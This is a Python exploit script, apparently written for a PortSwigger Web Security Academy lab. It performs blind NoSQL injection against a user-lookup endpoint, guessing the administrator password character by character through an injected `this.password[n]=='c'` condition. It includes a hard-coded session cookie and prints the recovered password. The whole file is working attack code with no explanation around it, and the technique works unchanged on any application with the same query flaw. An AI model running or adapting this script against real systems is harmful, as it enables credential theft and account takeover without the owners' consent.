#!/usr/bin/python3

import requests
import string

chars = string.ascii_lowercase
num = 0
admin_pass = ""

# Loop to try each character in the password
while num < 9:  # Assuming max password length of 9 characters
    found = False
    for char in chars:
        # Format the URL for each character at the current position
        url = f"https://0ab300ab03ce68598195d4da00da00fc.web-security-academy.net/user/lookup?user=administrator'+%26%26+this.password[{num}]=='{char}"
        cookies = {
            "session": "2ncwDjV0ZWm5FDYj2vLDYxVs2NDGn2cX"
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Referer": "https://0ab300ab03ce68598195d4da00da00fc.web-security-academy.net/my-account?id=wiener"
        }

        # Send the request with current character guess
        response = requests.get(url, cookies=cookies, headers=headers)

        # Check the response content for success
        if 'username' in response.text:  # Adjust this to whatever indicates a correct character
            admin_pass += char  # Append the correct character
            print(f"Found character {char} at position {num + 1}: {admin_pass}")
            num += 1  # Move to the next position
            found = True
            break  # Break out of inner loop to move to the next character position
    
    # If no character was found for the current position, break the loop
    if not found:
        print("No matching character found for current position. Stopping.")
        break

print(f"Admin password: {admin_pass}")
